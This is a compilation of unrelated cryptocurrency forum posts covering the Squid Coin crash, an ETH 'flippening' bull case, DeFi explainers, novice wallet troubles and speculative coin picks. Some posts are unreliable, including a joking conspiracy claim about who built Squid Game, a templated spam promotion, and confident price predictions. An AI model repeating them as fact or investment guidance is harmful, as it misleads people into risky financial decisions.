Investment is risky, investment needs to be calm
"Squid Coin" (SQUID). The issue price of Squid Coin on October 26 was only 1 cent, but after the market opened on November 1, the price of this cryptocurrency has soared, skyrocketing hundreds of thousands of times to reach a peak of US$2861.8. Next, the squid coin plummeted at a more rapid rate, and the price fell to $0.0007926 within 5 minutes. The price of this token has soared by more than 230,000% in the past week, reaching $2,861.80 at one time, and then crashed. It fell to zero on Monday morning Eastern Time, a decrease of 99.999976%. According to data from the blockchain tracking and analysis platform BscScan, about 40,000 people still hold the virtual currency after the flash crash. According to the white paper, the digital currency started pre-sale on October 20 and "sold out within 1 second."

Looking at throwing some money at the crypto wall and get in early on something to hold long term.

My Preferred Criteria:

Should be on kucoin

Should be outside of the top 100 coins on cmc

Tell me why you think its going to 10x soon (tech, mainnet launch, supply, use case, marketing push)

For my contribution:

One I found this morning that Im looking at is DERO right now cause its a private DAG coin, so like monero but with dag  stuff also. 3 Founding Devs are anonymous though and theyre supposedly launching smart contracts soon so might be a good bet. Could be a flop though if the devs arent that serious about making a thriving ecosystem. I did not research that hard.

Thank you in advance for the losses.

Looks like I need to write more.

So far I have hit on eth, antshares (neo), and ftm and almost sol but I chose fantom over sol after picking both and wouldve won either way. To be fair, I lost a good chunk on icx and also cryptopia hack. Alas, Im looking to see if I can find another diamond in the rough and I can get in early this time so I can 1000x my money and buy a lambo or just relax in the Bahamas for a while till I get bored and decide to do something with my life. 

Hopefully this is a constructive conversation to help us all be wildly successful and gain financial independence while at the same time ruined from ever putting money in anything else because it only makes 10% or 1% annually.

this is pretty cool free training I came across that seems like a great way for \[PROFESSION\] to make a little extra money on the side

&amp;#x200B;

its pretty long, over an 1hr nbut the presenter seems like a really successfull online businessperson and the method seems prety easy.

&amp;#x200B;

I was wondering if anyone else has tried out these methods for making money on line

 (Part 1: The Merge is a must read to understand the effects of the Merge and understanding why the flippening has a high chance of happening once the Merge is live. I wont explain in detail some concepts already covered in part 1 | [Link to Part 1](https://techmaxi.medium.com/the-long-term-bull-case-for-eth-part-1-the-merge-understanding-the-change-in-market-dynamics-b6e8c51315a7) )

&amp;#x200B;

The flippening is the most hyped event in the history of blockchains, the moment in which ETH becomes the top crypto by marketcap, taking Bitcoins spot. It was close to happening in 2017, and every time ETH has a big run on the ETH/BTC pair (also called the ratio) all the ETH holders get excited about it and the drums of the flippening can be heard across the internet, only to fall short as the ratio goes down and the flippening fails.

Theres a sentence which gets repeated every time the ratio makes a big run: this time is different. Is this time different and will the flippening finally happen? 

To answer this question we need to analyze the main reasons which explain why the flippening was very hard to achieve and the solutions that have been slowly coming online. The Merge will be the final stone to allow a successful flippening, solving multiple of these issues at the same time.

There are four main reasons which are holding the flippening back:

1. High sell pressure

2. Lack of fee capture

3. Not enough scale

4. Insufficient demand

&amp;#x200B;

1.High sell pressure

Under PoW the Ethereum network has been massively overpaying for security by having a high ETH issuance, its overpaying by a factor of x10 compared to the issuance there will be under PoS. Having a high issuance is the same as having a high sell pressure which causes the ratio to go down, as miners must sell most of the ETH gained to cover costs. To compare it with BTC, ETH has a far higher security budget (including into the calculation priority fees and MEV) than BTC while having less than half of its market cap. 

The problem of an excessive sell pressure is being fixed by two big changes; the first change has been EIP 1559 which went live in August. What EIP 1559 does is burning most of the gas fees (the base fee gets burned while the priority fee still goes to miners), instead of the full fees going to miners, which reduces the sell pressure. Since EIP 1559 went live, around 80% of total fees get burned.

The Merge is the second big change which will heavily reduce sell pressure, expected to go live around Q2 2022. Once live, the issuance of new ETH will be reduced by 90%. Additionally the issuance wont go to miners anymore, under PoS the issuance will go to validators, which are less likely to sell the ETH gained as validators have much lower costs compared to miners.

A similar network usage as we have been seeing since EIP 1559 went live combined with PoS will make ETH be deflationary.

A massive reduction of the sell pressure through EIP 1559 and the Merge will make the ratio go up as long as demand remains the same.

&amp;#x200B;

2. Lack of fee capture

Until very recently the Ethereum network didnt benefit from increased usage, all the fees paid to make transactions or interact with smart contracts would go to miners which would be mostly sold. ETH holders didnt benefit directly from network usage, only miners did.

EIP 1559 changes this, now that most of the fees are burned, the value of those fees burned go to ETH holders, it acts as a buy back mechanism.

To visualize this buy back mechanism lets imagine ETH has a supply of 100 ETH, each of them with a value of $1, the market cap would be $100. We now imagine that in 1 year ten of those ETH get burned due to a high usage of the network, theres now 90 ETH, but the market cap is still $100, the tokens get burned but the value doesnt. The value goes to ETH holders, now one ETH is worth around $1.11 instead of the $1 it was worth at the beginning, every token holder has benefited from the high usage of the network and has gained around 11%.

As of now ETH is set to burn more than $10b in fees annually, all of it going to token holders. In the future as ETH scales with L2s and data shards, more and more fees will be burned, making ETH more and more valuable. EIP 1559 acts as buying pressure which will push the ratio up.

&amp;#x200B;

3. Not enough scale

Historically runs on the ratio have happened during bull markets. The fees start low as we leave the bear market but quickly go up as prices and speculation ramps up. Users start to discover all the things that can be done on the ETH network, only to be hit with high gas fees due to a lack of scale. Most users end up being priced out from using the network and end up moving to other L1s which can offer more scale and low fees by disregarding decentralization and security. A big number of these users not only will leave the network, but they will also sell their ETH and instead buy the token of the network they moved to. 

While block space has been going up these last years, the demand has increased exponentially. However in recent months layer 2 solutions (L2s) have started to come online, which is one of the two technologies ETH will use to scale. A layer 2 solution allows execution to be done off chain, L2s post a proof to the layer 1 (by doing so the L2 is as secure as the L1 it posts the proof to) of the transactions that were made. By doing this a L2 can scale orders of magnitudes higher than L1 and have much lower fees. ETH on layer 1 can do around 15 transactions per second (TPS) while a layer 2 can do up to 1000 TPS. Optimism and Arbitrum are L2s which have gone live in recent months and are slowly scaling their systems to reach 100s of TPS and eventually up to a 1000 TPS. In the next months more and more L2s are expected to go live, such as zkSync and StarkNet, and many more will be coming online in the next years. Some of these L2 solutions will combine a zk-rollup posting proofs to the L1 with the possibility of using off-chain data (this kind of hybrid solution is called a volition). Volitions are much more scalable (by sacrificing some security when using off-chain data) and will be able to offer 1000s of TPS before data shards are live.

In the future L2 solutions will be combined with data shards, which will provide a big amount of block space to post transaction proofs. A single L2 using data shards will be able to scale to tens of thousands of transactions per second, and the full scale of all L2s combined using data shards will be in the millions of TPS by the end of the decade.

L2s being able to offer low fees with the security of ETH is very important as most of the users dont have enough capital to be able to afford transactions on the layer 1. These users will now be able to use ETH directly and wont need to move to other networks. With a bigger amount of users ETH can support, more of them will invest into ETH to use as a collateral into DeFi, to yield farm, to stake or just to hold as an investment. Its also important to note that all these L2s pay transaction fees to be able to post the proofs on the layer 1, these fees are burned, going to token holders through EIP 1559, adding more upward pressure on the ratio.

&amp;#x200B;

4. Insufficient demand

DeFi and NFTs are very young, before 2020 the ETH network was mostly empty, ETH demand was fundamentally very low. We saw very high demand for ETH in 2017 to invest into ICOs but after that not much could be done with it except buying and holding waiting for the price to go up. 

Nowadays this couldnt be further from the truth, ETH allows you to participate in 100s of different dapps such as Compound and Aave which allow you to put ETH as a collateral and borrow assets against it. You can use your ETH to provide liquidity at AMMs like Uniswap and Sushiswap and gain fees from doing so. You can use your ETH to buy all kinds of NFTs, from profile pictures, to in game assets for games like Axie, to NFTs that will grant you exclusive benefits such as access to a DAO. You can use your ETH to yield farm. You can use your ETH to swap tokens on chain, trade with leverage and buy options.

Something equally as big or even bigger as the demand for DeFi and NFTs is the possibility of staking your ETH to help secure the network and gain a yield from it, made possible by the switch to PoS.

ETH locked in DeFi protocols has gone from less than 5 million at the beginning of 2020 to more than 35 million in 2021. While the amount of ETH being staked has hit more than 8 million, before the Merge has gone live. The number is expected to increase much faster once the Merge is live, as the execution risk will be lifted and withdrawals of the ETH gained will be enabled shortly after. 

We have gone from not being able to do much with ETH in the years prior to 2020, to be able to do all kind of things with it. Its possible to never have to sell ETH by generating a yield from it or getting a loan against it.

The demand for ETH has been going up year after year, more and more users are buying ETH as a long-term investment, once again adding significant buy pressure on the ratio. The move to PoS will accelerate this trend.

&amp;#x200B;

Why is the Merge so important?

It helps solve two of the four issues, the first one being the most important. The high pressure ETH has before the merge makes it very hard for the ratio to sustain a high number, and almost impossible to maintain the flippening if it were to happen. Once the Merge goes live the sell pressure will be mostly eliminated, and the four issues will finally be all solved and allow the flippening to happen. Something else which is equally as important is the massive demand the Merge will enable for ETH, millions and millions of ETH will be bought and accumulated to be staked.

Theres of course a lot of work remaining, especially in the scaling side but the four main points dont need to be perfectly solved for the flippening to happen. Solving the scaling issue will be fundamental for ETH to become the global settlement layer, which will be the focus of part 3.

&amp;#x200B;

TLDR

Four main reasons were making the flippening very hard to achieve:

\-High sell pressure, fixed by EIP 1559 burning most of the fees and the Merge reducing new issuance by 90% plus replacing miners with validators, which are less likely to sell their ETH. With almost all the sell pressure eliminated, the ratio can go up much more easily.

\-Lack of fee capture, fixed by EIP 1559, all the fees burned act as a buy back mechanism, billions and billions of dollars in fees burned going to ETH holders acting as upward pressure on the ratio.

\-Not enough scale, fixed by L2s. Users with small to medium amount of capital are now able to use ETH directly, ETH will be collecting more fees and gaining huge amounts of ETH investors.

\-Insufficient demand for ETH in previous years, fixed by DeFi, NFTs and the demand to stake ETH.

&amp;#x200B;

As usual everyone loves predictions, so here is mine, the flippening has a very high chance of happening in the next 6 months after the Merge has gone live.

In other words, how is the crypto market not just the "stock/forex market of the future" or is that actually its entire value proposition? I'm working through this as I type so my thoughts may be incoherent or incomplete, but bear with me.

Investing in a cryptocurrency and investing in a company are very similar. In both cases, people are betting on specific infrastructure, ecosystems, vision, and implementation of solutions within a particular niche. For example:

* Betting on Amazon is betting on its vision for eCommerce. 
* Betting on Tesla is betting on its vision for EVs and sustainable energy. 
* Betting on Bitcoin is betting on its vision for a digital store of value. 
* Betting on Ethereum is betting on its vision for a platform for decentralized apps.

With crypto, discounted future user adoption seems to be the primary fundamental analysis driver. With stocks, it's discounted future cash flows. However, cash flows are essentially a proxy for user adoption adjusted for customer acquisition costs, retention rates, upselling rates, etc. Each customer is converted to a base-dollar unit based on this analysis and expected increases in either customer base or increases in that dollar value equivalent are what drive public investment. 

Similarly, a currency is equity in a country. Central banking systems rely on demand for their respective currencies to survive and they employ monetary policy to stimulate spending and investment, control inflation, and ensure a healthily growing economy. Monetary policy is a central bank's specific implementation of a specific solution to sustaining economic growth and driving investment in its currency. 

DeFi has the potential to make these central banks redundant, sure, but "tokenomics" is just a shiny new word for monetary policy. DeFi platforms rely on demand for their respective currencies just like any central banking system. Buying ADA is betting on Cardano's specific tokenomics just like buying USD is betting on the Fed's specific monetary policy. The only substantial difference here is that a crypto's demand isn't tied to any particular nation's economy. Not to mention there's no guarantee that the world's crypto platform of choice will be decentralized.

A cryptocurrency takes traditional financial concepts, digitizes them, and strips away a few layers of bureaucracy, but it's precisely *because* of that bureaucracy that crypto is able to make certain assumptions and abstract away a lot of the monetary policymaking process. At its core, it's the same as any publicly-traded company or central bank: a specific implementation of a specific solution for a specific use case that relies on user adoption and public investment to grow. 

I'm not doubting the future of crypto, mind you. Just wondering why the popular sentiment seems to be that crypto is *fundamentally* different than the financial systems we currently have in place, save for a few quirks. It seems to me that the end goals and the mechanics of each are one and the same, but crypto simply employs a far heavier use of technology to reach that goal because it doesn't need to worry about maintaining "backwards compatibility" with physical assets. Am I right in this?

every well known crypto fund manager, analyst, youtuber etc has these crazy high price targets (yes i know price targets are a joke). no one talks about how much longer or when they think this bull run will end before an inenvitable correction. when do you guys think this bull run will be over? jan, feb mid next year?

Has anyone else seen this news? Solves a big issue I've seen with many projects - Niftybase literally functions as a smart contract, so all the creators have to do is input the attributes, rarities and artwork. Kinda huge considering how many projects fail at the smart contract hurdle. 

[https://www.marketwatch.com/press-release/nft-collection-launchpad-niftybase-prepares-for-mid-november-release-with-three-upcoming-drops-2021-11-01](https://www.marketwatch.com/press-release/nft-collection-launchpad-niftybase-prepares-for-mid-november-release-with-three-upcoming-drops-2021-11-01)

Any other thoughts? I'm fairly new to the scene (fell down the rabbithole a little over 2 months ago), would love more experienced input!

Squid Game is the hottest token around here. It had one brutal hourly candle, which lead to tons of people hating on the devs, but apart from that, it's pumping really nicely. 

Now, I want to prefront this, by saying, I'm not a conspiracy crackhead, but the truth is, I figured out, who the Squid Game devs are. It's mind-blowing, really.

Are you prepared?

 \-- The Biden administration developed Squid Game. 

"Hold up", you may say, "the Biden administration?"

Yes, really!

You just have to open your eyes and observe, what's happening in the US.

1) The US government is broke af. They almost ran out of money in October and barely managed to get an extension until December. In December, they will run out of money again. They are desperate and even considered printing a 1 trillion dollar coin.

Now is, where the sneaky part starts. It's a two-fold process:

2) Janet Yellen, the Treasury Secretary in the Joe Biden administration, proposes a tax on unrealised capital gains

3) Some FBI undercover devs develop Squid Game. An unsellable crypto, which is guaranteed to go up in price.

Connect the dots, people!

Squid Game was developed to fix the tax deficit. People will buy into Squid Game, make mad gains and then get taxed to keep this government afloat.

I realize smart contracts are an essential element of NFTs (they're the tech that stores the meta data and points to the url where the NFT is hosted), but why would I need an NFT for, say, a potential future decentralized real estate transaction? There's no digital asset to point to, is there? Couldn't I just generate a smart contract on the Ethereum network? I feel like I'm missing something because I keep hearing that NFTs are the future, but I fail to see how anything other than a smart contract is needed for proof of ownership in anything other than digital art.

I just finally figured out how to connect my meta-mask to pancake swap. Complicated process for me but figured it out. 

I tried buying some shitcoins previously using ETH and holy gas fee. 

Anyways trying to figure out searching pancakeswap. 

Are some coins only available with ETH or can anything be swapped with BNB? 

Searched for a few I thought were there and they are not.  

Any guidance appreciated or are there other swap exchanges to connect meta to? 

Also, to narrow search, any tips for tokens worth looking into on pancake? Im only going to buy a few with small amounts just for fun and maybe get lucky with one of these that take off 1000%.

I really have not that much knowledge but I just bought some Solana and I added the majority into staking. I also transferred a bit just to try to Phantom and I got some SAMO. All that mega quick with a fee of basically almost nothing (like 0.0000x Solana as fee).   


With ETH I can't do much on days like today where gas is so high. Much slower and fees (gas) are crazy expensive. Even when gas is low (50), it is expensive.  


Can somebody explain it to me like I am 5 years old? Is it because ETH is much older? Can ETH be beaten at this point or they can just coexist together?

[Me struggling out](https://preview.redd.it/hxj43o4kctx71.jpg?width=424&amp;format=pjpg&amp;auto=webp&amp;s=486682d7d6efb3a3a0b51b65531ea61e17011224)

Hey Guys, 

I was kinda trying to learn for the past couple of days and learning what to do and stuff. At first, I was checking coinmarketcap predicting what are the good tokens and getting good results and was good most times in my predicting and studying graphs. T*hen came the real application !!* I tried buying GRMzilla tokens as I was following it for a couple of days or nearly a week. I tried to use MetaMask but couldn't buy from it so I went for Trust wallet, the minimum was 50 dollars using moonpay 3rd party *\*it sucks I know\**. then I got into Pancakeswap and got my Token.

I was having troubles as it always gives me shit like cant calculate gas but then I fixed it by removing decimals or fractions.  Now.. when I try to convert the tokens back to BNB or USDC I couldn't. it just gives me crap like insufficient money or cant calculate gas. and I also found out my number of tokens were decreasing on its own. I was like wtf. I don't mind fucking it up this time, nobody learns for free we got to lose to learn.

So now here come my questions,

1- what Platforms do I use other than trust wallet if there is better?

2- what is the best place to buy BNB smart chain other than Moonpay?

3- why were the tokens decreasing on their own? I heard there is a kind of tax sometimes.

4- what did I do wrong and what should I do next time or any kind of advice 

5- how to solve this gas error or insufficient amount to convert the GRMzillas? is the gas reduced from the tokens or do I have to have BNB for any swap even if it is from GRM to anything else?

I had everything working out till I got to those technical shit, I am a student so thought trading in crypto was going to help me financially so I would appreciate any help or advice from you guys.

Thanks in Advance.

I just want to say that I am so happy that I finally decided to take some time to read/learn about cryptocurrencies in 2021, I know a lot of people that have been investing for the past year and everytime they would try to talk to me about crypto I would say yeah yeah but I am good enough with the stock market blablabla. Well no, I was missing out on a lot of good projects and a lot of money. Back in the days, the only projects I was aware of was Bitcoin and Bitconnect, shit I even gave a buddy of mine 200$ to put in Bitconnect and it they pulled the rug a month later so I lost everything. You can see why I didn't show much interest in crypto. Anyways this year in january my friend peeked my interest again and I jumped in, bought some btc in the 20k's 30k etc, got myself some Eth under 2k, took a 20k loan at 4% and put it all in USDC for a 10% APY.
Feels different than being invested in shitty Mj stocks that have been bleeding since 2018 lol.
Anyways I feel late and early at the same time, I haven't made any life changing money yet but it feels good to be invested in Crypto.

Cheers and have a great weekend

I've started investing in crypto since ~March 2021. Since then I informed and educate myself about crypto and investing a lot and I wouldn't call myself a crypto newbie, but consider myself advanced in crypto knowledge until now:

The Polkadot parachain auctions are beginning soon, so I DYOR about the projects, which I could support in the upcoming *"crowdloan""*.

*(Info about crowdloan: Projects need to bid in an auction in order to win a parachain slot, Polkadot chain itselfs works as a main relay chain, the other chains are "docked" to it and are called parachains.)*

So I wanted to participate in the crowdloaning stuff.

My research says: **You need at least 5 DOT to participate!**

So I DCA 2 to 3 months long into DOT to get my precious total 6 DOTs, one more DOT as needed just in case if transaction fees are required.

Today I withdrew the 6 DOT onto my wallet. Everything fine so far, I did not worry, because I'm advanced crypto hodler (let's see how it goes).

There is a project I wanted to support and looking at some guides, it tells me to transfer my DOTs into "Polkadot.{js}" (DOTs hotwallet, the ETH counterpart of MetaMask).

So I did transfer my 6 DOT to Polkadot.{js}: **4.98 DOT received**

"What the heck?", I thought. 1 DOT needs to be kept on a wallet to keep it active. 

"Ok, fine.", I reassured myself this is ok, went back to my exchange to get half a DOT to fill it up. I paid exchange withdrawal fee + paid transaction fee, but at least my Polkadot.{js} hot walllet has its 5 DOT.

"Ready to rumble", I was eager to start supporting my project and started to crowdloan:

While clicking and confirming some popups, it finally went to the page where I have to write in the amount I want to contribute: ** 5 DOT **

**A Error message appears** At least 1 DOT is needed on a wallet! Even my Polkadot.{js} needs 1 DOT to keep to active!!!!!

Now I'm fiat broke, no crowdloaning this month, see you guys next month when I have gathered enough money for my 6th DOT (I use the money I can afford to lose, money which I used to buy cigarettes, but I stopped smoking in order to invest in crypto...pro tip: I'm much healthier today!).

In every bull market, the quality of crypto subreddits (and other mediums) tend to go down from the perspective of those who were already there. This is a natural occurrence due to the influx of new participants that don't already know and abide by the culture.

In the past, we would often see a reversion back toward previous standards as crypto moved into bear territory, but would never achieve the previous cycle's level of quality. 

Sort of a two steps forward, one step back situation. Or more appropriately - **Two steps toward shit, one step away from shit**.

However, this cycle is looking like it could be the final step as we continue to move further down the [technology adoption life cycle](https://en.wikipedia.org/wiki/Technology_adoption_life_cycle). 

Which brings us to:

# Crypto's Eternal September

**Eternal September** is the term used to describe September of 1993, when AOL started offering Usenet access for their users. Usenet had a very specific culture that would either weed out or force conformity to their annual influx of college students gaining access through their university for the first time. Similar to anyone joining an established group.

However, when AOL opened access to their millions of users all at once, the existing user base was swamped and unable to absorb the sheer volume while maintaining their culture and standards.

(First rule of Usenet - I know, I know...)

What we are seeing in this bull run is very reminiscent. If the technology continued to gain popularity, this was inevitable. Sure, if there was a massive drop in price you would see a large chunk of the day traders / gamblers look for greener pastures, but the principle would remain the same. 

Every cycle brings in a fresh crop, many of who stick around and influence the direction of the culture moving forward. This crop just happened to be YUGE.

# Crypto OGs

Its natural as a participant that has watched their beloved forums turn to flaming piles of shit to be frustrated. I feel your pain, but its part of the process.

**Its important to remember that this was the goal the entire time.**

 We all fantasized about this point, and to assume the masses wouldn't come in and trample all over your flowerbed was naive. It happens in everything that gains popularity. 

**So what's the point?**

In the words of Elsa, "Let it Go." The ship has sailed. If you can't beat em, join em.

'As so many new people have joined crypto and this sub, I thought of reposting one of my informative posts. I hope it helps you learn a few things. Pass it forward.'


What is Defi?

Well it stands for Decentralised finance.

&amp;#x200B;

In the past we have always used centralised finance.

Which is where there's a central authority that controls the flow of money.

The government and the banks control it.

They don't really say they do but they do they can print more of it if they want to.

They can stop you from borrowing it if they don't want you to.

They can even stop you from having a bank account

The alternative is Decentralised finance, Defi, where there are no banks, instead there are pieces of code that run and act as a bank.

They're open to anyone, They don't require you to trust them because they're literally a piece of code running a program.

If you wanted to you could read through it and verify that it's not going to scam you.

They are also censorship resistant and lastly they are much much cheaper than traditional centralized finance.

&amp;#x200B;

Decentralised finance is built on three main things,

1. Cryptography
2. The blockchain technology
3. Smart contracts

&amp;#x200B;

Five Pillars of DeFI,

1. Stable Coins.
2. Lending and Borrowing.
3. Decentralised Exchanges.
4. Insurance
5. Margin Trading

&amp;#x200B;

# Stable Coins -

So first off we need to understand the bridge of decentralised finance to centralised finance and that is, cryptocurrency that is matched to a real-world asset.

&amp;#x200B;

For Example,

Dai, Tether and USD coin are all what we call stable coins.

This is because their price is tied to the united states dollar.

Think about it like this when you buy one for one dollar

a new USD coin is minted when you withdraw one, a USD coin is burned, so the coin is always worth one united states dollar.

Now the purpose of this is to have a reliable way to buy and sell certain coins without having to

buy and sell them.

&amp;#x200B;

# Borrowing and Lending -

So another important pillar of decentralised finance is lending and borrowing.

In fact a huge part of our current financial situation in the world is based on lending and borrowing money so it would make sense that the blockchain could do it better, Using Code, with complete anonymity.




# Decentralized Exchanges -

So I have a friend who traveled to london a few years ago from the United States, now of course in london the standard currency is pounds while in the US it's dollars.

So naturally he had to visit a foreign exchange booth and trade out his dollars for pounds,  unfortunately for him the fee was like 15 so he immediately lost 15 percent of his money.

Because that's what foreign exchange traders do. Tourists don't know any better and they need local money so what they do is they take advantage of these people.

Well when it comes to Decentralised Finance, Instead of a foreign exchange trader we have what is called a Decentralised exchange, where you can exchange your coins and tokens for other coins and tokens.

Now the fees are usually very small like less than half of a percent which is a great benefit for anyone who regularly wants to trade their crypto assets.

# Insurance -

In todays volatile market, Collateral Protection Insurance provides borrowers and lenders with a sense of security from crypto lending networks, which is a critical step in advancing blockchain adoption.

# Margin Trading -

DeFi crypto margin trading refers to the practice of using borrowed funds from a broker to trade a financial asset, which forms the collateral for the loan from the broker. Usually broker in DeFi its one of autonomous money markets.


# Pros of Defi -

1. Permissionless
2. Immutability
3. Transparency
4. Lending and Borrowing Applications.
5. Savings Applications.
6. Tokenization

&amp;#x200B;

# Cons of Defibrillates -

1. Scalability
2. Uncertainty
3. Concerns of Liquidity
4. Shared Responsibility

I've missed out on all these amazing altcoin gems because I was brainwashed by Bitcoin maxi propaganda about how all altcoins are going to zero.  


I ended up only making about 7X on my initial investment despite being in the space for years. These are truly pathetic gains.   


I was too risk-averse because I was ignorant enough to think that only Bitcoin would pass the test of time, and all these altcoins would end up being fads.   


I absolutely despise every single Bitcoin maxi, but I cannot blame anyone but myself. At the end of the day, it was me who chose to subscribe to their bullshit.   


They use their following to deter newcomers from buying promising altcoins so that they can pump their bags filled with this garbage boomer coin. I hate them so much.    


Bitcoin maxis are the biggest threat to your wealth.

Im a big fan of staking coins in wallets, not LPs but straightforward wallet staking.

I am earning 10+% by staking Harmony One and about a month ago I thought I would get cute.

After a nice run up from 0.15 to 0.25 I thought the time was prime to undelegate the coins and execute a scalp trade.  After all, the coin had to fall eventually because what comes up must come down.  All I needed to do was be patient and time it right.

My goal was simply to acquire more ONE and it backfired.

I sold the small bag and the coin continued to rise.  I waited as long as I could bear and bought it back - I also used some of the fiat to pay bills which wasnt part of my plan  now Harmony is stable around 30 cents which is over what I sold it at so I am hesitant to buy back the same amount I once had ugh

If you arent an experienced trader and you want to avoid the remorse I am feeling then my suggestion would be to simply buy and stake and repeat.  If you believe in the project and it has a good return on your staking then just relax and know that the temptation to get cute may end up leading to regret.

As for me, I learned a lesson and I still have my little bag that Im content with. It is just a little lighter than it once was.  Id have to inject more fiat if I want it to be what it once was.  If the coin drops then Ill be happily doing so.  Until then.. Im chillin

And boy oh boy he was delightful /s

My dad always kinda made fun of me. Hes always pretty supportive, but when it comes down to crypto, he makes fun of me. Telling me its not safe, Im going to lose all my money, yada yada

So, I started out a year or two with crypto. Not really doing any research, I just threw my money (not much) in the crypto space, made some bad calls etc. But I managed to triple my initial investment since the moment I started out. Being happy and a bit proud, I told him yesterday. 

You know what he said?

WeLl ThAt AiNt MuCh.

What the hell? I was baffled. He, the one against it, mocking me for being bad at. I couldnt believe it. 

Who else is having trouble clearing things up for their parents?

Well According to Bloomberg:

JUST IN: chia_project President &amp; COO hoffmang discusses their newly announced partnership with WorldBank. "The goal is to create a decentralized, centralized database. Every nation's carbon registry can come together in a single place"

For peo0le who may know know Chia, its that coin that uses proof of time and space and can be mined by hard drives instead of GPUs. You need a lot of hard drives and at some point hard drive prices sky rocketed because of Chia. It doesn't need too much electricity but the payback period of investment was too long ( around two years I huess). It is kind of greener than bitcoin and etherum which consume a lot of energy. At the beginning, when it started 7 month a go media made a big deal about it but then it wasn't that popular until now thay their cooperating with world bank came out. 
This was just se information, Im not trying to convince anybody to buy CHIA. I was just curious about it.

Mr. Robot is a TV series based around a hacker and taking down the US financial systems. I won't go into the details of the series, but in Season 2 Episode 11 (Aired Sept 14, 2016) there was a conversation between 2 people. The CEO (Phillip) of the largest financial company (Evil Corporation, yes really is called that in the series) and a person in the white house (Jack). This isn't the full transcript, but these are the parts that predicted the CBDC:

Jack: I cannot do it. It is unconstitutional.

Phillip: Look, with Ecoin equal to one dollar it'll free up the economy.

...

Jack: It's unconstitutional. You can't make your own currency. That is the federal government's job.

Phillip: I am not the problem here. The problem here is hard cash is fading rapidly. 

Phillip (cont.): That's just the way of the world right now, and Bitcoin is spreading. And if Bitcoin takes over, we are all in a world of hell. 

Phillip (cont.): It is unregulated, it's already reached its transaction volume maximum and it is partly controlled by Chinese miners.

...

Phillip: With Ecoin, we control the ledger and the mining servers. 

Phillip (cont.): We are the authority. 

Phillip (cont.): I will make sure that you have visibility into every single wallet that's open, every loan, every transaction, which means we can start making new assets, which means we cab start rebuilding the banking sector with your your having to inject even more politically unpalatable federal funds into it.

Jack: The president will laugh at my face.

Phillip: But he'll know this is the right thing to do.

Phillip (cont.): This is going to be controlled by a good, old fashioned American company. 

Phillip (cont.): You want to regulate it? Be my guest. Regulate the shit out of it.

Phillip (cont.): I'll give you back doors, side doors, tracing, whatever you want.

Phillip (cont.): Just don't shut it down.

Phillip (cont.): This was always the future, Jack.

&amp;#x200B;

If this wasn't a fucking crystal ball then I don't know what is.

Hear me out. Me and you are here for $$$. So lets cut the BS and get to the point.

Bitcoin is a bubble. A bubble, formed by the mass-power of the unknown; older people, children, teenagers interested in buying 10 Lamborghinis just pouring their money in to the first coin they trust. 

Thats bitcoin.

Once people research and the entire world holds a grasp of cryptocurrency and really studies, they will find out bitcoin is nothing but hollow gold. Sure it can reach 100,000 or even 500,000 a coin.

But you think that it will happen while Solana is engaging in turbo-boost with their mega technology advances, Ethereum 2.0 about to smash out a bitcoin, LOOPRing having 0 fees, Jasmy going to absolutely slaughter Ethereum.. Im just so, confident.. that I feel awful posting this.

I have a feeling, that Bitcoin will rise.. but will die..

 I believe bitcoin would be #1 if they got a better team but its almost 2022 not 2008. The technology is behind. If people want digital currency, cryptocurrency in general is  just that.

Sure you missed out on billions of dollars, but you think other coins will not achieve that?

Only noobs will answer that question. Professionals will act a trifecta on the success.

Crypto has been pumping lately whether its ETH making ATH after ATH or whether its SHIB making us lose our minds. Each and every one of us go to great boundaries to shill our bag to new highs. So just for fun (and to catch a break from clicking the refresh button on coingecko) let me see if i can guess your largest and heaviest bag. Explain it as simply as you want, as complex as you want or simply using emojis, sky is the limit. 

Let me go first, but oh wait i lost my crypto in a boating incident. 

If you know you know. Cheers everybody.

Hello crypto redditors,  


Have you stumbled upon any product that gives you manual tracking of portfolio &amp; goal setting and tracking for spot and futures trading?  


What I mean is: you have entered your entries + goals for selling coins on futures and spot &amp; set goals that you want to reach with your porftolio?  
[Cointracker.io](https://Cointracker.io) &amp; [https://coinpanda.io/](https://coinpanda.io/) are great but they don't really give me this possibility, excel or google sheet with some advanced scripts can deal with this issue but nothing else.  
Feedback is much appreciated!

Just like the scenario that played out in squid coin a lot of people got rich over night and couldnt sell, their money got stuck and they lost everything they invested, majority of them didnt read the white paper to know it was just like the tv show where theres only one survivor and just like the game the person who created it was the last man standing. 
   Most people who discovered btc early and bet on it by holding for this long paid of in the end, this also applies to thousands of other coins where people took the risk and benefited off it. In the end we are all taking a chance.

Shit coin can make you rich and you can also loose your money, just read the white papers before jumping into any coin

when I compare last November and this November i see two different people. yes, i was completely broke and i had no trust on myself that i can even do anything. Then i got to know about crypto by a friend. Started learning about it online, invested a very short amount that time but luckily got a very good profit. That first profit is unforgettable to me. As a girl I'm earning more than most of my friends ( even the one who introduced crypto to me ) 
Inshort, Crypto obviously changed my life in a year. I wonder where it's gonna take me in later years. It's just that choose wisely the projects you're investing in and you got it!!! So ladies, keep your crypto game up!!

Ps: I got moons for the first time as well. They made me feel like i can actually achieve something on my own. So glad.

The new wave of fundraisers happening in crypto are absolutely ridiculous. Lots of projects are latching on to the NFT/play to earn narrative and trying to raise funds for their game that will "change the world"

A fucking game does not require a token in the first place. Okay, maybe when the game is fully functional and in use for a long time, a token can decentralise it. Or atleast when some basic functionality of the game is built, a token can come in to gamify some aspects of it.

One of the legit games like Gods Unchained has now launched a token almost 2 years after the game has been playable and functional. The focussed on building the game first, and now the token is just the icing on the cake and decentralises the game, gives control of the game to its users. 


But lots of NFT/crypto game projects are just raising funds without anything whatsoever. Just like 2017 ICO scams, they have a whitepaper with a fancy description of the game, a website, but nothing else. 


Once the token has launched, they trade the tokens on the top exchanges, shill the token hard even though it has almost no use. Throw in a liquidity mining event to build excitement over the game (but actually just the token because the game doesnt even exist yet) 

Then try to sell NFT for the game, again based on just promises. All through this, the game is nowhere to be seen. The team has shown no ability to actually build a game, but wants to keep raising funds


Game development is really complex, a good game is actually much more complex than a simple crypto defi project that can be forked out of an existing one. A game requires a lot of code and development, co-ordination between parts of the game and to implement NFTs and crypto in it is highly advanced project. You need a legit game dev studio to build these games. 

Some threadbare project with a whitepaper and emoji photo devs is not going to be the worldclass game development studio that is going to launch the next minecraft of league of legends. 

These kind of projects are invariably scams, and the full extent of these scams wont be visible till the next bear market where these teams will slowly but surely disappear without a trace.

Hey guys,  
